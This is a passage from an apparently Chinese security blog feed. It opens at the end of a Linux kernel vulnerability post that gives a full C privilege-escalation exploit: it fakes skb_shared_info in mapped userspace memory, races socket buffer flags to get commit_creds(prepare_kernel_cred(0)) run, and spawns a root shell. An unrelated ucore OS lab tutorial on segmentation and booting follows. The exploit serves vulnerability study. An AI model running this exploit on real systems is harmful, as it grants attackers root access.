alt="image-20230424232217901"></p><p>而这个就是竞争成功的例子</p><p><img src="https://s2.loli.net/2023/08/09/mnKeZfNH8JugtaC.png" alt="image-20230424232904128"></p><p>成功调用用户态布置好的提权程序<code>get_root</code></p><p><img src="https://s2.loli.net/2023/08/09/aX4GjJY3izyL1oS.png" alt="image-20230424233018952"></p><p>挺随缘的，而且有时候进入了<code>getuid() == 0</code>的分支了起的shell还是普通用户的。</p><p><img src="https://s2.loli.net/2023/08/09/5vEs9THS1PAaZNo.png" alt="image-20230419230033142"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a4b80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a4f30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info_t</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> callback;        <span class="comment">// void (*callback)(struct ubuf_info *, bool)</span></span><br><span class="line">  <span class="keyword">uint64_t</span> ctx;             <span class="comment">// void *</span></span><br><span class="line">  <span class="keyword">uint64_t</span> desc;            <span class="comment">// unsigned long</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info_t</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  nr_frags;        <span class="comment">// unsigned char</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  tx_flags;        <span class="comment">// __u8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_size;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_segs;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_type;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint64_t</span> frag_list;       <span class="comment">// struct sk_buff *</span></span><br><span class="line">  <span class="keyword">uint64_t</span> hwtstamps;       <span class="comment">// struct skb_shared_hwtstamps</span></span><br><span class="line">  <span class="keyword">uint32_t</span> tskey;           <span class="comment">// u32</span></span><br><span class="line">  <span class="keyword">uint32_t</span> ip6_frag_id;     <span class="comment">// __be32</span></span><br><span class="line">  <span class="keyword">uint32_t</span> dataref;         <span class="comment">// atomic_t</span></span><br><span class="line">  <span class="keyword">uint64_t</span> destructor_arg;  <span class="comment">// void *</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  frags[<span class="number">16</span>][<span class="number">17</span>];   <span class="comment">// skb_frag_t frags[MAX_SKB_FRAGS];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sk_sndbuf = 0xffffff00 =&gt; skb_shinfo(skb) = 0x00000000fffffed0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SNDBUF 0xffffff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHINFO 0x00000000fffffed0ul</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info_t</span> <span class="title">ubuf_info</span> = &#123;</span>(<span class="keyword">uint64_t</span>)&amp;get_root, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//struct ubuf_info_t ubuf_info = &#123;0xffffdeaddeadbeeful, 0, 0&#125;;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info_t</span> *<span class="title">skb_shared_info</span> = (<span class="title">struct</span> <span class="title">skb_shared_info_t</span> *)<span class="title">SHINFO</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKBTX_DEV_ZEROCOPY (1 &lt;&lt; 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">skb_thr</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">//skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line">skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_thr</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Write blocks until setsockopt(SO_SNDBUF).</span></span><br><span class="line">write(sockets[<span class="number">1</span>], <span class="string">&quot;\x5c&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line"><span class="comment">// skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] got r00t\n&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        perror(<span class="string">&quot;execl()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// printf(&quot;[-] something went wrong\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span> *addr;</span><br><span class="line"><span class="keyword">int</span> rv;</span><br><span class="line"><span class="keyword">uint32_t</span> sndbuf;</span><br><span class="line"></span><br><span class="line">addr = mmap((<span class="keyword">void</span> *)(SHINFO &amp; <span class="number">0xfffffffffffff000</span>ul), <span class="number">0x1000</span>ul,</span><br><span class="line">PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,</span><br><span class="line"><span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (addr != (<span class="keyword">void</span> *)(SHINFO &amp; <span class="number">0xfffffffffffff000</span>ul)) &#123;</span><br><span class="line">perror(<span class="string">&quot;mmap()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] userspace payload mmapped at %p\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">pthread_t</span> skb_th;</span><br><span class="line">    rv = pthread_create(&amp;skb_th, <span class="number">0</span>, skb_thr, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;pthread_create()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// usleep(10000);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] overwriting thread started\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">rv = socketpair(AF_LOCAL, SOCK_STREAM, <span class="number">0</span>, &amp;sockets[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;socketpair()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] sockets opened\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">sndbuf = SNDBUF;</span><br><span class="line">rv = setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUFFORCE,</span><br><span class="line">&amp;sndbuf, <span class="keyword">sizeof</span>(sndbuf));</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;setsockopt()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] sock-&gt;sk_sndbuf set to %x\n&quot;</span>, SNDBUF * <span class="number">2</span>);</span><br><span class="line"><span class="comment">// skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line"><span class="comment">// skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span></span><br><span class="line"><span class="comment">// write(sockets[1], &quot;\x5c&quot;, 1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if (getuid() == 0) &#123;</span></span><br><span class="line"><span class="comment">// printf(&quot;[+] got r00t\n&quot;);</span></span><br><span class="line">    <span class="comment">//     system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">pthread_t</span> write_th;</span><br><span class="line">rv = pthread_create(&amp;write_th, <span class="number">0</span>, write_thr, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;pthread_create()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] writing to socket\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Wake up blocked write.</span></span><br><span class="line">rv = setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUF,</span><br><span class="line">&amp;sndbuf, <span class="keyword">sizeof</span>(sndbuf));</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;setsockopt()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//usleep(10000);</span></span><br><span class="line">    <span class="comment">// skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line"><span class="comment">// skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// if (getuid() == 0)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;[+] got r00t\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//     execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</span></span><br><span class="line">    <span class="comment">//     perror(&quot;execl()&quot;);</span></span><br><span class="line">    <span class="comment">//     // system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// close(sockets[0]);</span></span><br><span class="line"><span class="comment">// close(sockets[1]);</span></span><br><span class="line"><span class="comment">// void *status;</span></span><br><span class="line"><span class="comment">// pthread_join(write_th, &amp;status);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;读一篇关于iot固件外设移植的paper时看到了有关该漏洞的描述，于是简要地看了一下，再此做一下记录&lt;/p&gt;
&lt;h1 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h1&gt;&lt;p&gt;在&lt;co</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ucore-lab</title>
    <link href="http://phot0n.com/2023/04/17/ucore-lab/"/>
    <id>http://phot0n.com/2023/04/17/ucore-lab/</id>
    <published>2023-04-17T07:04:17.000Z</published>
    <updated>2023-04-30T10:09:13.213Z</updated>
    
    <content type="html"><![CDATA[<p>感觉自己开发经验很少，多以写脚本为主，没怎么接触过较为大型的项目，所以想搞点开发相关的经验。打算借ucore再回顾一下OS相关的知识。这个项目啃完之后打算看看南大的那个模拟的lab，然后学点C++逆向。</p><p>BASIC-KNOWLEDGE记得比较杂(因为感觉知识点很多都关联)，把LAB里面相关的知识点还有一些代码分析都写进去了，可以挑着看…</p><p>需要注意的是该OS针对的是x86下的,有些概念是x86独有的，64位下已不适用。</p><h1 id="BASIC-KNOWLEDGE"><a href="#BASIC-KNOWLEDGE" class="headerlink" title="BASIC-KNOWLEDGE"></a>BASIC-KNOWLEDGE</h1><h2 id="关于实模式和保护模式"><a href="#关于实模式和保护模式" class="headerlink" title="关于实模式和保护模式"></a>关于实模式和保护模式</h2><p>实模式和保护模式为CPU的工作模式，简单来说就是规定CPU寻址与工作的方式</p><h3 id="实模式及其工作原理"><a href="#实模式及其工作原理" class="headerlink" title="实模式及其工作原理"></a>实模式及其工作原理</h3><p>实模式出现于早期8088CPU。其产生的主要原因是为了更好地寻址。当时地CPU有20位地地址线，但是寄存器只有16位(8个通用寄存器，4个段寄存器)。为了能够完整地去访问20位的主存地址，人们构想出这样一个方案:当某条指令想要访存时，必须通过<strong>段基址:段偏移量</strong>的形式进行访问。</p><p>段基址由段寄存器提供，而段偏移量由通用寄存器来提供。我们之前说过，当时CPU的寄存器只有16位，我们通过段寄存器和通用寄存器的组合方式来达到20位，这种方式很容易想到，就是</p><script type="math/tex; mode=display">物理地址=段基址<<4+段偏移量</script><p>比如我们段寄存器中的值位0x1230,而段偏移量为0x0011，则对应的物理地址则为0x1230&lt;&lt;4+0x0011=0x12311</p><p>但是我们很容易发现这种寻址方式很不安全，随便一个程序就能修改别人的内存。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>随着CPU的发展，其地址线从原来的20根变为了32根，同时寄存器的位数也变为了32位。此时实模式下的内存地址计算方式已经不适合了，所以就引入了保护模式。</p><p>在保护模式下，CPU的32位地址线全部都有效(也就是说可以寻址4GB的物理地址空间)，但是我们内存寻址的方式还需要兼容老办法，也就是实模式下的寻址方法(段基址:段偏移量的形式)。</p><p>我们的偏移量其实和实模式下是一样的，除了位数有变化。主要大的变化在于段寄存器。此时段寄存器存放的不是段基址了，而是一个叫<strong>段选择子</strong>的东西，通过这个选择子，我们可以从<strong>描述符表(GDT或LDT)</strong>中获取对应的<strong>段描述符</strong></p><p><img src="D:\DeskTop\PhotonWork\source\_posts\ucore-lab\o_2109200226344-2.png" alt=""></p><p>其结构如下</p><ul><li><code>0-1</code>位为请求特权级</li><li><code>2</code>位为表指示位，代表了应该访问哪个描述符表</li><li><code>3-15</code>位代表索引。类似从数组中根据下标取元素一样，我们也可以通过索引在描述符表中获取描述符</li></ul><p>下面我们来说说描述符表，这里主要针对全局描述符表。<strong>全局描述符表(GDT)</strong> 是一个保存段描述符的数组，其起始地址保存在<strong>全局描述表寄存器(GDTR)</strong>中。GDTR长48位，其中高32位为基地址，低16位是段界限。</p><p>全局描述符表里面存的是段描述符</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\ucore-lab\o_2109191244474-1.png" alt=""></p><p>一共有64位(这张图上下两个代表的不是两种结构，而是一个结构的前半段和后半段) 从类型上来说，主要分为3个部分:<code>段基址</code> ，<code>段界限</code>，<code>属性</code> 。但是观察这张图我们可以发现其实每个部分并不一定是连续的(比如段基址以及段界限就被拆成了两段)</p><p>简单来说，它就是一个64位的约定俗成的结构体，其结构如下</p><ul><li>低32位的<code>0-15</code>位，高32位的<code>16-19</code>位为段界限长</li><li>低32位的<code>16-31</code>位以及高32位的<code>0-7</code>、<code>24-31</code>位为段基址</li><li>高32位的<code>8-15</code>、<code>20-23</code>位代表着各种属性</li></ul><p>其用代码表示就是这样的,对应上面的图就能明白</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> limit_low;       </span><br><span class="line">    <span class="keyword">uint16_t</span> base_low;</span><br><span class="line">    <span class="keyword">uint8_t</span> base_middle;</span><br><span class="line">    <span class="keyword">uint8_t</span> access;</span><br><span class="line">    <span class="keyword">unsigned</span> limit_high: <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> flags: <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> base_high;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>我们可以通过这样一个函数来设置一个段描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gdt_install</span><span class="params">(<span class="keyword">uint8_t</span> num, <span class="keyword">uint32_t</span> base, <span class="keyword">uint32_t</span> limit, <span class="keyword">uint8_t</span> access, <span class="keyword">uint8_t</span> flags)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup the descriptor base address */</span></span><br><span class="line">    gdt[num].base_low = (base &amp; <span class="number">0xffff</span>);</span><br><span class="line">    gdt[num].base_middle = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    gdt[num].base_high = (base &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup the descriptor limits */</span></span><br><span class="line">    gdt[num].limit_low = (limit &amp; <span class="number">0xffff</span>);</span><br><span class="line">    gdt[num].limit_high = ((limit &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, set up the granularity and access flags */</span></span><br><span class="line">    gdt[num].flags = flags;</span><br><span class="line"></span><br><span class="line">    access |= AC_RE; <span class="comment">// 设置保留位为1</span></span><br><span class="line">    gdt[num].access = access;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下就是，我们在保护模式下从逻辑地址到线性地址地过程是:</p><ul><li>先通过段寄存器中的段选择子获取索引，与段描述符表地基址相结合，获取段描述符</li><li>根据段描述符得到了段基址</li><li>通过段基址+偏移地址，得到了线性地址</li></ul><p>(这里补充一下地址的分类，地址分为<strong>逻辑地址</strong>，<strong>线性地址</strong>以及<strong>物理地址</strong> 。逻辑地址经过分段机制之后形成了线性地址，如果不启用分页的话，此时线性地址就是物理地址，而采用分页的话，线性地址经分页转换之后形成物理地址)</p><h2 id="关于启动"><a href="#关于启动" class="headerlink" title="关于启动"></a>关于启动</h2><p>电脑是如何启动一步步把控制权交给用户的，这是一个很多人都想过的问题。这里面我们需要注意的概念有这么几个:<code>BIOS</code>、<code>MBR/Bootloader</code>、<code>OS</code></p><h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p><code>BIOS</code>是ROM中的一段代码，其被映射到地址<code>0xF0000~0xFFFFF</code>。其入口地址为<code>0xFFFF0</code>。它主要提供这么几个功能:</p><ul><li>提供和硬件交互的接口(比如基本的输入输出功能)</li><li>硬件检测，读取硬件信息</li><li>查找并加载可启动设备</li></ul><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><p>MBR全称为Master Boot Record（主引导记录)</p><p>当加电的一瞬间，CPU的CS:IP寄存器被强制初始化成了<code>0xF000:0xFFF0</code> </p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20230428145341002.png" alt="image-20230428145341002"></p><p>这里其实是一个跳转指令，来跳转到BIOS真正的代码</p><p>进入BIOS进行一系列初始化之后，检查启动盘中位于0盘0道1扇区的内容，即检查扇区末尾是否是magic number <code>0x55</code>和<code>0xaa</code>，如果是的话则加载这一扇区的512字节到<code>0x7c00</code>然后跳转到此处执行</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20230428145757799.png" alt="image-20230428145757799"></p><p>这里便是我们Bootloader的开始。在目录boot/下查看bootasm.S文件可以发现，此时运行的代码便是我们bootasm.S中的代码</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20230428145843753.png" alt="image-20230428145843753"></p><p>那么启动到bootasm之后怎么跳转到我们的内核呢，注意到在bootasm.c中会有如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protcseg:</span><br><span class="line">    # Set up the protected-mode data segment registers</span><br><span class="line">    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">    movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line"></span><br><span class="line">    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    movl $start, %esp</span><br><span class="line">    call bootmain</span><br></pre></td></tr></table></figure><p>调用了<code>bootmain</code>函数，而这个函数是我们在<code>bootmain.c</code>当中定义的，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 